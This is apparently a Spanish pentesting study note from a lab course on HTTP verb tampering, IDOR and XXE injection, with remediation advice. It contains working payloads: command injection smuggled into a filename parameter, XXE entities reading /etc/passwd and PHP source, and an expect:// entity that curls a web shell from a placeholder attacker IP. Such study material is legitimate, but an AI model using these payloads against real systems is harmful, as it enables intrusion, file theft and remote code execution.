
## HTTP Verb Tampering 

> El HTTP Verb Tampering es una técnica de evasión que explota métodos HTTP alternativos (como HEAD, PUT o DELETE) para eludir controles de seguridad o acceder a recursos restringidos.
> GET: Solicita una representación del recurso especificado, sin modificarlo.
> HEAD: Igual que GET, pero sin el cuerpo de la respuesta.
> POST: Envía datos al servidor, usualmente causando cambios o efectos secundarios.
> PUT: Reemplaza completamente el recurso especificado con el contenido enviado.
> DELETE: Elimina el recurso especificado.
> CONNECT: Establece un túnel hacia el servidor de destino.
> OPTIONS: Informa sobre las opciones de comunicación disponibles para el recurso.
> TRACE: Realiza una prueba de bucle de mensaje hasta el recurso objetivo.
> PATCH: Aplica modificaciones parciales a un recurso.
<img width="648" height="380" alt="image" src="https://github.com/user-attachments/assets/027cf822-f119-421f-bec8-7ecba22e40dd" />



### Bypassing Basic Authentication
Comprobar el tipo de solicitudes que acepta, para ejecutar acciones las cuales estan restringidas unicamente a cierto tipo de cabeceras (Mala configuracion)
```
curl -i -X OPTIONS http://SERVER_IP:PORT/

nmap -p 41414 --script http-methods 94.237.54.192
```

### Bypassing Security Filters
Al estar protegido contra inyeccion de comandos o caracteres especiales, pero igualmente en solo el Verb POST, se podria Bypassear modificando la peticion
En este caso incluso permitiendo la Ejecucion Remota de Comandos

```
POST /index.php HTTP/1.1
Host: 94.237.54.192:41414
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-CO,en;q=0.7,en-US;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.54.192:41414/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

filename=file1%3B+touch+file2%3B

o

filename=file; cp /flag.txt ./
```

**Recomendaciones Para el Cliente - Verb Tampering Prevention**
Esta configuración suele presentarse en todos los CMS en:

- Apache en _.htaccess_ con `<Limit GET>`
- Tomcat en _web.xml_ con `<http-method>GET</http-method>`
- ASP.NET en _web.config_ con `<allow verbs="GET" roles="admin">`

Las remediaciones para esto son usar en:

- Apache: `<LimitExcept>` en lugar de `<Limit>`
- Tomcat: `<http-method-omission>` en lugar de `<http-method>`
- ASP.NET: usar `add`/`remove` o reglas más amplias para todos los métodos

______________________________________________________________________________________
______________________________________________________________________________________

## Insecure Direct Object References (IDOR)

> Una vulnerabilidad IDOR (Insecure Direct Object Reference) ocurre cuando una aplicación permite el acceso directo a objetos mediante identificadores manipulables sin un control de acceso adecuado, lo que puede permitir a atacantes ver, modificar o eliminar recursos de otros usuarios.
---
### Identifying IDORs
El primer paso para explotar IDOR es identificar referencias directas a objetos, como:
- `?uid=1`  
- `?filename=file_1.pdf`
Estos parámetros pueden encontrarse en URLs, APIs, cookies, etc.
Basta con cambiar el valor (ej. `uid=2`) o usar fuzzing para detectar acceso no autorizado a otros datos.

### Llamadas AJAX y código frontend
Frameworks JavaScript a veces exponen funciones sensibles según el rol del usuario. Revisando el código JS se pueden descubrir endpoints ocultos.
```js
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
Aunque esta función no se invoque como usuario normal, puede ejecutarse manualmente y ser vulnerable si no hay control en el backend.

### Hash/codificación en referencias
Algunas aplicaciones usan codificación (ej. Base64) o hashing (MD5, SHA) para ocultar referencias.
Ejemplo codificado (Base64):
- URL: `?filename=ZmlsZV8xMjMucGRm` → `file_123.pdf`
Si no hay validación de acceso, puede modificarse:
- Nueva URL: `?filename=ZmlsZV8xMjQucGRm` → `file_124.pdf`
Ejemplo con hash:
```js
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
Si se puede identificar el algoritmo, se pueden generar hashes de otros archivos.

### Comparación entre usuarios
Registrar múltiples usuarios permite analizar diferencias en los parámetros.
Ejemplo de respuesta API:
```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```
Podemos intentar acceder como otro usuario (`users/2`) para ver si se devuelven datos sin validación.
---




**Recomendaciones Para el Cliente - IDOR Prevention**

Implementar un sistema de Control de Acceso Basado en Roles (Role-Based Access Control (RBAC))

________________________________________________________________________________
________________________________________________________________________________

## XML External Entity (XXE) Injection

> XML (eXtensible Markup Language) es un lenguaje de marcado diseñado para almacenar e intercambiar datos estructurados. A diferencia de HTML, no está enfocado en visualización sino en representar la estructura de los datos.
> Es posiblemente vulnerable cualquier aplicacion web que envie datos en formato XML

Ejemplo básico:
```xml
<email>
  <sender>john@example.com</sender>
  <body>Hello</body>
</email>
```

---

### Componentes clave de XML

| Llave       | Definición                                                                 | Ejemplo                             |
|-------------|----------------------------------------------------------------------------|-------------------------------------|
| **Tag**     | Claves de un documento XML, entre `<` y `>`                                | `<date>`                            |
| **Entity**  | Variables XML, encerradas entre `&` y `;`                                   | `&lt;`                              |
| **Element** | Elemento raíz o secundario con valor entre una etiqueta de inicio y fin    | `<date>01-01-2022</date>`          |
| **Attribute** | Especificaciones dentro de etiquetas, usadas por el analizador XML       | `version="1.0" encoding="UTF-8"`    |
| **Declaration** | Línea inicial que define versión y codificación del XML               | `<?xml version="1.0" encoding="UTF-8"?>` |

---

### ¿Qué es un DTD?

El **DTD (Document Type Definition)** define la estructura de un documento XML. Puede incluirse dentro del XML o como archivo externo.

Ejemplo embebido:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

También puede referenciarse de forma externa:
```xml
<!DOCTYPE email SYSTEM "email.dtd">
```

---

### Entidades XML

Las entidades actúan como variables. Pueden definirse directamente o apuntar a archivos externos:

```xml
<!ENTITY company "Inlane Freight">
<!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
```

Estas entidades pueden usarse en el documento con `&company;` o `&signature;`. Al analizar el XML, el servidor sustituye estas entidades por su contenido.

### Explotación de XXE

1. **Entidad Externa para Divulgación de Archivos Locales**:
   Inyectando una entidad externa que apunte a un archivo local, como `/etc/passwd`:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```

2. **Uso de `php://filter` para Leer Código Fuente**:
   Si la aplicación está en PHP, se puede usar `php://filter` para leer archivos codificados en base64:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```

3. **Ejecución Remota de Código (RCE)**:
   Si la aplicación permite, el filtro `expect://` en PHP puede ejecutar comandos remotos, como descargar un shell:
   ```xml
   <!DOCTYPE email [
     <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
   ]>
   <email>
     <sender>attacker@example.com</sender>
     <body>&xxe;</body>
   </email>
   ```

---

### Consejos Adicionales

- XXE también puede usarse para **SSRF** (Server Side Request Forgery) al acceder a puertos locales.
- Los **servidores modernos** protegen contra XXE mediante configuraciones específicas (desactivar DTDs, por ejemplo).




